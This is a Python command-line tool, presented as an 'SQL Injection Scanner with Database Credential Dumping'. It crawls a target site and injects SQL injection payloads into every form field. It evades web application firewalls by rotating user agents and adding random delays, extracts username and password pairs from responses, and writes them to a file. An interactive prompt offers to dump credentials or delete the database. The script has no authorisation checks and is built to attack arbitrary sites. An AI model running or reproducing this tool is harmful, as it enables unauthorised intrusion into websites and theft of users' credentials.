import requests
import logging
import time
import random
import hashlib
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import re
import colorlog  # For colored logging

# Setup colored logging
LOG_FORMAT = "[%(levelname)s] %(message)s"
logging.basicConfig(level=logging.DEBUG, format=LOG_FORMAT)

# Create a color log handler with a proper colored formatter
logger = logging.getLogger()
handler = colorlog.StreamHandler()
formatter = colorlog.ColoredFormatter(
    "%(log_color)s[%(levelname)s] %(message)s",
    datefmt=None,
    log_colors={
        'DEBUG': 'yellow',
        'INFO': 'yellow',
        'WARNING': 'yellow',
        'ERROR': 'yellow',
        'CRITICAL': 'yellow'
    }
)
handler.setFormatter(formatter)
logger.addHandler(handler)

# SQL injection payloads
payloads = [
    "' OR 1=1 --",  # Basic SQLi payload
    "' UNION SELECT NULL,NULL,NULL --",  # Union based injection
    "' AND SLEEP(5) --",  # Time-based injection (delayed response)
    "'; SELECT table_name FROM information_schema.tables --",  # Tables enumeration
    "'; SELECT column_name FROM information_schema.columns WHERE table_name = 'users' --",  # Columns enumeration
    "'; SELECT username, password FROM users --",  # Attempt to dump credentials (example)
    "' AND 1=1 --",  # Boolean-based true condition
    "' AND 1=2 --",  # Boolean-based false condition
]

# Headers to make requests seem normal
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}

# Time delay to avoid hitting WAFs
def delay_request():
    time.sleep(random.uniform(0.5, 1.5))  # Random delay between 0.5 and 1.5 seconds

# Function to evade WAF detection using user-agent rotation
def get_random_user_agent():
    agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0',
        'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; AS; en-US) like Gecko',
    ]
    return random.choice(agents)

# Function to dump credentials to a file
def dump_credentials(credentials):
    with open('dumped_credentials.txt', 'a') as f:
        for cred in credentials:
            f.write(f"Username: {cred[0]}, Password: {cred[1]}\n")
    logger.info("Credentials dumped to 'dumped_credentials.txt'")

# Function to perform SQL injection on a URL with the given payloads
def test_sql_injection(url, method, form_data):
    found_credentials = []

    for payload in payloads:
        data = form_data.copy()  # Avoid modifying original form data
        for key in data:
            data[key] = payload  # Inject the payload into each form input field

        try:
            delay_request()
            headers['User-Agent'] = get_random_user_agent()
            if method.lower() == 'get':
                response = requests.get(url, params=data, headers=headers, timeout=5)
            elif method.lower() == 'post':
                response = requests.post(url, data=data, headers=headers, timeout=5)
            else:
                continue

            # Check for specific payloads that may result in database dumps
            if payload == "'; SELECT username, password FROM users --" and "username" in response.text and "password" in response.text:
                logger.info(f"SQL Injection found at {url} with payload {payload}")
                # Extract the credentials (this assumes the response contains them in a recognizable pattern)
                creds = re.findall(r'(\w+)\s*:\s*(\w+)', response.text)
                found_credentials.extend(creds)

            if found_credentials:
                dump_credentials(found_credentials)
                found_credentials.clear()  # Reset found credentials after dumping
                return True  # Return True if we have found and dumped credentials
            else:
                return False

        except requests.exceptions.RequestException as e:
            logger.error(f"Error testing SQL injection on {url}: {str(e)}")

    return False

# Function to scan forms on a page
def scan_forms(url):
    try:
        response = requests.get(url, headers=headers, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')

        forms = soup.find_all('form')
        logger.info(f"Scanning {len(forms)} forms on {url}")

        for form in forms:
            action = form.get('action')
            method = form.get('method', 'get').lower()
            action_url = urljoin(url, action)

            form_data = {}
            inputs = form.find_all('input')
            for input_tag in inputs:
                name = input_tag.get('name')
                if name:
                    form_data[name] = ""  # Empty data for injection

            if form_data:
                if test_sql_injection(action_url, method, form_data):
                    logger.info(f"Vulnerability found at {action_url}. Would you like to take further action?")
                    action_choice = input("Enter 1 to dump credentials, 2 to delete database (type 1 or 2): ")
                    if action_choice == '1':
                        logger.info("Proceeding to dump credentials.")
                    elif action_choice == '2':
                        logger.info("Proceeding to delete database.")
                        # Here, you would put code to delete or modify the database (be careful with this!)
                else:
                    logger.info(f"No SQLi vulnerability found on {action_url}.")
            else:
                logger.info(f"No form inputs found on {url}.")
    except requests.exceptions.RequestException as e:
        logger.error(f"Error while fetching {url}: {str(e)}")

# Function to crawl and explore the target URL (multiple pages)
def crawl(url):
    urls_to_scan = [url]
    visited_urls = set()

    while urls_to_scan:
        current_url = urls_to_scan.pop()

        if current_url in visited_urls:
            continue

        visited_urls.add(current_url)
        logger.info(f"Scanning {current_url}")
        scan_forms(current_url)

        # Crawl links on the page
        try:
            response = requests.get(current_url, headers=headers, timeout=5)
            soup = BeautifulSoup(response.text, 'html.parser')

            # Extract all hyperlinks
            links = soup.find_all('a', href=True)
            for link in links:
                full_url = urljoin(current_url, link['href'])
                parsed_url = urlparse(full_url)
                if parsed_url.netloc == urlparse(url).netloc:  # Limit to the same domain
                    urls_to_scan.append(full_url)

        except requests.exceptions.RequestException as e:
            logger.error(f"Error fetching links from {current_url}: {str(e)}")

# Main function
def main(target_url):
    logger.info(f"Starting SQL Injection scan on {target_url}")
    crawl(target_url)
    logger.info("Scan completed")

if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description="SQL Injection Scanner with Database Credential Dumping")
    parser.add_argument('-u', '--url', type=str, required=True, help="Target URL")
    args = parser.parse_args()

    main(args.url)
